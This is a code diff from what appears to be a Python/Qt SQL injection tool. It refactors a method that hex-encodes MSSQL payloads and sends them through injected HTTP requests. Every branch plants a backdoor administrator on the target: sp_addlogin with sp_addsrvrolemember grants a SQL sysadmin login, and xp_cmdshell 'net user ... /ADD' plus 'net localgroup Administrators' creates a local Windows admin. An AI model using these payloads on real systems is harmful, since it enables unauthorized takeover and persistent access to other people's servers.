@@ -116,25 +116,25 @@ class Worker(QtCore.QThread):
     def addUserTask(self):
         if self.vars['type'] == "sql":
             #Adding sql user
-            self.vars['hex'] = core.txtproc.strToHex("master..sp_addlogin '" + self.vars['username']\
+            hex = core.txtproc.strToHex("master..sp_addlogin '" + self.vars['username']\
             + "','" + self.vars['password'] + "'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Adding 'sysadmin' rights for our user
-            self.vars['hex'] = core.txtproc.strToHex("master..sp_addsrvrolemember '" + self.vars['username']\
+            hex = core.txtproc.strToHex("master..sp_addsrvrolemember '" + self.vars['username']\
             + "','sysadmin'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
         else:
             #Adding windows user
-            self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'net user " + self.vars['username']\
+            hex = core.txtproc.strToHex("master..xp_cmdshell 'net user " + self.vars['username']\
             + " " + self.vars['password'] + " /ADD'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
             #Adding windows user to local group 'Administrators'
-            self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'net localgroup Administrators "\
+            hex = core.txtproc.strToHex("master..xp_cmdshell 'net localgroup Administrators "\
             + self.vars['username'] + " /ADD'", True)
-            query = self.wq.buildQuery(self.qstring, self.vars)
+            query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
